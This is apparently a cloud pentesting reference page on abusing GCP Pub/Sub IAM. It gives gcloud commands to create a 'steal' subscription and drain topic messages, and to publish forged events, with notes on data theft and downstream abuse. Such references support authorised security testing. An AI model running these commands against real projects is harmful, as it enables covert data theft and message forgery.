---
title: "Pub/Sub: capturing and injecting topic messages"
description: "Reading or publishing to Pub/Sub topics and subscriptions through broad IAM to capture or inject messages."
keywords:
  - Pub/Sub
  - topic
  - subscription
  - pubsub IAM
  - message
---

# Pub/Sub

Pub/Sub carries event data between services, so IAM that lets you read a subscription or create one on a topic turns into a data tap, and publish rights let you inject messages that downstream systems trust. The permissions to look for are `pubsub.subscriptions.consume`, `pubsub.topics.attachSubscription`, and `pubsub.topics.publish`.

## Siphon a topic

```bash
gcloud pubsub topics list
gcloud pubsub subscriptions list

# pull from an existing subscription
gcloud pubsub subscriptions pull <sub> --auto-ack --limit 100

# or attach your own subscription to a topic and drain it
gcloud pubsub subscriptions create steal --topic <topic>
gcloud pubsub subscriptions pull steal --auto-ack --limit 100
```

## Inject messages

```bash
gcloud pubsub topics publish <topic> --message '{"forged":"event"}'
```

## Exploitation notes

- Creating a new subscription on a topic is a quiet, durable tap: it keeps receiving every message until deleted.
- Topics often carry sensitive application events (auth, billing, PII), so a drained subscription is direct data theft.
- Injected messages are processed with the trust the consumer places in the topic, a path to downstream abuse.

## Tools

- **gcloud** (`pubsub subscriptions pull`, `topics publish`).

## References

- [HackTricks Cloud: GCP Pub/Sub](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/index.html)
- [Hacking the Cloud: GCP](https://hackingthe.cloud/)
- [Google: Pub/Sub access control](https://cloud.google.com/pubsub/docs/access-control)
